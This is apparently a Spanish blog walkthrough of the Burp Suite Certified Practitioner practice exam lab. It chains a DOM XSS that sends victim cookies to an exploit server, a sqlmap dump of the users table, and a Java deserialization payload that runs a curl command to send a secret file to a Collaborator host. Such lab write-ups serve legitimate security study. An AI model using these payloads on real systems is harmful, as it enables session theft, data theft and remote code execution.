---
layout: post
title: Burp Certified Practitioner Practice Exam.
subtitle: Practice Exam Burp Certified Practitioner.
tags: [burp]
---
# Practice Exam.

El examen consta de una aplicación con tres vulnerabilidades que deben de ser explotadas secuencialmente con los siguientes propósitos:

1. Robar la cuenta de un usuario sin privilegios.
2. Elevar privilegios a la cuenta del administrador.
3. Robar el flag contenido en el fichero /home/carlos/secret del servidor que hostea la aplicación web.

El tiempo límite son dos horas. 

<br />

### Vul1: DOM-based XSS.

En primer lugar accedemos a la primera aplicación web del examen y nos encontramos con diversas pestañas, home, Admin panel, My account y Advanced search. Dado el hecho de que tenemos un tiempo limitado para resolver esta aplicación no conviene lanzar un escaneo general de la misma. Por el contrario, las pestañas Admin Panel y Advanced Search están vedadas para el nivel de privilegios que tenemos actualmente.

Así, lanzamos un escaneo sobre la barra de búsqueda de la pestaña "home". Durante el escaneo se nos informa de la existencia de una vulnerabilidad DOM-Based XSS por lo que recurrimos a la herramienta DOM Invader presente por defecto en el navegador asociado a Burp y buscamos el canario TEST obteniendo:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613152414.png' | relative_url }}" text-align="center"/>
</div>

El input se introduce en un código JavaScript en el que podemos intentar introducir un payload. Así, para comprobarlo, intentamos provocar un "alert()" mediante:

```javascript
","test":alert(1)}//
```

Con esto lo que hacemos es cerrar el elemento mediante unas comillas y creamos otro separado por una coma cuyo nombre es "test" y cuyo valor es "alert(1)" y finalmente cerramos la estructura javascript y empleamos dos barras para comentar el resto del código. Da resultado con lo que se puede introducir código JavaScript. Ahora para mayor seguridad intentamos hacer que la página nos enseñe las cookies sin éxito debido a que el término "document.cookie" se bloquea mediante un WAF. Así por lo tanto, para evitar este bloqueo, podemos incluir un término encodeado que desencodeamos en el propio payload:

```javascript
eval(atob("<ciphertext>"))
```

Con 'eval' provocaremos que el engine ejecute las funciones siguientes que se encuentren dentro del paréntesis. Con 'atob' decodificamos un string encodeado en base64. Así, si eval no es un término que se bloque en el navegador y si el servidor no lleva a cabo una validación del código nuestro payload codificado en base 64 se ejecutará en el navegador de la víctima. Para encodear en linux un texto en base64 empleamos:

```bash
echo "<text>" | base64 | tr -d '\n'
```

Así, encodeamos el término "alert(document.cookie)" en base64 y se lo pasamos como argumento a la función compuesta de 'eval' y 'atob' obteniendo nuestras cookies en el navegador. Ahora sólo queda encontrar la forma de hacer llegar la respuesta envenenada a una víctima.

Para ello vamos a emplear la funcionalidad del "exploit server" del propio examen de práctica, el cual simula un servidor que hostea una página web que podemos modificar a conveniencia para almacenar código javascrip, html, etc y que entre otras cosas posee una funcionalidad, "Deliver exploit to victim" que simula una víctima que ejecuta cualquier enlace que reciba.

De esta forma, construimos el siguiente código javascript:

```javascript
var xmlhttp = new XMLHttpRequest();xmlhttp.open("GET",`http://127.0.0.1:8000/?cookie=${document.cookie}`,false);xmlhttp.send(null);
```

Esto lo que hace es llevar a cabo una request a una dirección arbitraria con su propia cookie como parámetro en la request. Así, si hiciera una request a un servidor bajo nuestro control, podríamos revisarla mediante el log y obtener el valor del parámetro cookie que podríamos utilizar para robar la sesión. En este caso, vamos a emplear la dirección del servidor del exploit aunque se podría hacer con cualquier otro tipo de servidor.

Así, cambiamos la dirección del servidor del envío de la request y lo encodeamos en base64 como hemos visto antes y se lo pasamos a la barra de búsqueda de la aplicación web como argumento de la función compuesta de 'eval' y 'atob' y le damos a buscar.

Esto tiene dos propósitos:

- Comporobar que el payload funciona antes de utilizarlo comprobando que en log del servidor de exploit del examen aparece una entrada con nuestra cookie:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613155602.png' | relative_url }}" text-align="center"/>
</div>

- Obtener una URL correctamente encodeada en la barra de navegación que utilizaremos en el servidor del exploit para construir un enlace que provoque que la víctima al ejecutarlo realice una request con el payload malicioso al servidor de la aplicación vulnerable y carge la respuesta maliciosa en una página haciendo así que el navegador de la víctima ejecute nuestro código javascript.

Esto lo conseguimos mediante la etiqueta html "iframe":

```html
<iframe src="https://ac061f641f7fd41cc13e69b7005b00cd.web-security-academy.net/?SearchTerm=%22%2C%22test%22%3Aeval%28atob%28%22dmFyIHhtbGh0dHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTt4bWxodHRwLm9wZW4oIkdFVCIsYGh0dHBzOi8vZXhwbG9pdC1hYzRkMWY1NzFmMjlkNDJiYzFlODY5MDMwMWVkMDBhNy53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQvP2Nvb2tpZT0ke2RvY3VtZW50LmNvb2tpZX1gLGZhbHNlKTt4bWxodHRwLnNlbmQobnVsbCk7Cg%3D%3D%22%29%29%7D%2F%2F"></iframe>
```

Esto será lo que colocaremos en la sección "Body" del servidor del exploit. Así, al pulsar el botón "Deliver exploit to victim" el examen simulará una víctima que recibirá un enlace que realizará una request via la URL maliciosa (el marco iframe incluye en la página el código html que se incluye en el atributo src de la propia etiqueta) que provocará la ejecución de javascript malicioso proporcionándonos su cookie:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613160126.png' | relative_url }}" text-align="center"/>
</div>

Esta es la cookie de la víctima y con ella podemos usurpar su sesión cambiando el valor de nuestra cookie de sesión por la suya en nuestro navegador si podemos o en una request al servidor web. Así:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613160313.png' | relative_url }}" text-align="center"/>
</div>

Como el navegador Chromium de Burp no vuelve permanente el cambio de cookie y tenemos acceso a la contraseña del usuario, copiaremos la contraseña (inspeccionar elemento) y nos logearemos como Carlos para no perder la sesión al mandar otra request al navegador. Así, habríamos terminado la primera vulnerabilidad.

<br />

### Vul2: SQL-injection.

Con la ganancia de una sesión también ganamos acceso al apartado "Advanced search" cuyo contenido antes nos estaba vedado. Con ello, volvemos a lanzar el escaner y se nos informa de una posible vulnerabilidad de SQL injection.

Para asegurarnos lanzamos la herramienta SQLmap mediante el siguiente comando:

```bash
sqlmap -u "https://ac061f641f7fd41cc13e69b7005b00cd.web-security-academy.net/filtered_search?SearchTerm=&sort-by=DATE&writer=" -p sort-by --cookie="_lab=47%7cMC0CFQCHJrZsNthVcY5jbqKhcRpKhgVdVwIUMIZQ4muX7QKzsAVvPjRpaUaH%2f%2b%2bDKS5S0rIote%2bD3AN7%2bPPeWMJI9cNcxcnDrBzfGzs%2fxH3Yvd%2bqidgg9tXa8ux8G6PLZzytbXtTBwCnjaSsNR%2bWhzeFgh7lljzg5iDsdVBKZ6pcOLDa; session=MDlRetGK13F5XKQzKf2wEJ6Nh7WXjcO6" --dbs
```

Con ello empleamos sqlmap que realiza un fuzzeo mediante el envío de muchas request con los siguientes modificadores:

- **-u**: Para aportar la URL con los parámetros adecuados.
- **-p**: Para aportar el parámetro a testear, por defecto se testean todos pero el escaner de burp nos informa concretamente del término "sort-by"
- **--cookie=**: Para aportar las cookies de sesión, ya que como esta funcionalidad sólo está disponible para determindos usuarios, si no mandamos la sesión las request que mande sqlmap serán bloqueadas por el servidor web.

- **--dbs**: Para obtener todas las bases de datos.

Después de realizar los ajustes adecuados se nos informa de que efectivamente el término "sort-by" es un punto de inyección y además podemos ver que está basado en times-delays:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613161249.png' | relative_url }}" text-align="center"/>
</div>

Así, termina diciendonos que hay una base de datos que se llama 'public', de forma que, seguimos profundizando y en el comando anterior cambiamos **--dbs** por **-D public --tables** para recuperar todas las tablas de la base de datos 'public'.

Nos informa de que existen tres tablas: comments, posts y users. Evidentemente, nos interesa la tabla 'users'. Así, nos disponemos a sacar el contenido de dicha tabla mediante **-D public -T users --dump** en lugar de **-D public --tables**.

Finalmente obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613163240.png' | relative_url }}" text-align="center"/>
</div>

Así, nos logeamos a la cuenta del administrador.
<br />

### Vul3: Java Deserialization.

Con la ganancia de las nuevas credenciales hemos ganado acceso a una nueva parte de la aplicación web que es el "Admin panel". Al revisar las cookies podemos observar que tenemos una cookie: admin_pref.

En el escaner obtenemos que se trata de una vulnerabilidad de objeto serializado de Java:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613164533.png' | relative_url }}" text-align="center"/>
</div>

Para verificarlo empleamos el auto-decodificador online: "CyberChef" y observamos que secuencialmente lo decodifica de URL > Base64 > GZip.

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613163510.png' | relative_url }}" text-align="center"/>
</div>

Así, lo llevamos al decodificador de BurpSuite para intentar ver su contenido decodificándolo en URL > Base64 y Gzip:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613163621.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar que se trata de un objeto serializado de Java. Para explotar esta vulnerabilidad vamos a emplear la herramienta "Java Deserialization Scanner" disponible desde Extender > BAppStore en burpsuite. Para configurarlo necesitamos además Ysoserial disponible desde el enlace: https://github.com/frohoff/ysoserial del cual tenemos que descargarnos el JitPack. Una vez descargado debemos condigurar el path para Burp:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613163916.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, capturamos una request que contenga dicha cookie y lo enviamos al Deserialization Scanner:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613164032.png' | relative_url }}" text-align="center"/>
</div>

Primero llevamos a cabo un "Manual testing", seteamos el "Set Insertion point" subrayando la cookie de admin_pref

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613164632.png' | relative_url }}" text-align="center"/>
</div>

Y seguidamente ponemos que es un objeto comprimido en gzip, que luego se encodea en base64 y luego en URL:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613164702.png' | relative_url }}" text-align="center"/>
</div>

Los resultados que aparecen a la izquierda nos informa de posibles vulnerabilidades:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613164738.png' | relative_url }}" text-align="center"/>
</div>

En Apache CommonsCollections3.

Así, vamos a la pestaña exploiting de la propia herramienta y repetimos los pasos: Configuramos la cookie como punto de inyección y seteamos la secuencia de codificación GZip > Base64 > URL.

En esta pestaña podremos emplear el payload a enviar a través de Ysoserial definiendo el tipo de objeto (CommonsCollection1, 2, etc) y el comando a ejecutar. En este caso, para estar seguros de que el payload se ejcuta vamos a intentar hacer una conexión con un sistema bajo nuestro control, esto es, un host con BurpCollaborator para asegurarnos de que se ejecuta nuestro payload:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613165116.png' | relative_url }}" text-align="center"/>
</div>

Al probarlo con CommonsCollections1 no funciona, seguimos probando hasta el CommonsCollection6, entonces:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613165251.png' | relative_url }}" text-align="center"/>
</div>

Así, terminamos empleando el siguiente comando a modo de payload en la sección de "Exploiting":

```bash
CommonsCollections6 'curl --data @/home/carlos/secret axbbfl7fa1w5zuw5zgf77qg6yx4nsc.oastify.com'
```

Lanzamos el ataque y vemos que en nuestro burp collaborator hay un HTTP request con el contenido del fichero:

<div style="text-align:center">
	<img src="{{ 'assets/img/Burp/Pasted image 20220613165706.png' | relative_url }}" text-align="center"/>
</div>

Lo emitimos como solución y abríamos terminado la primera app del examen.




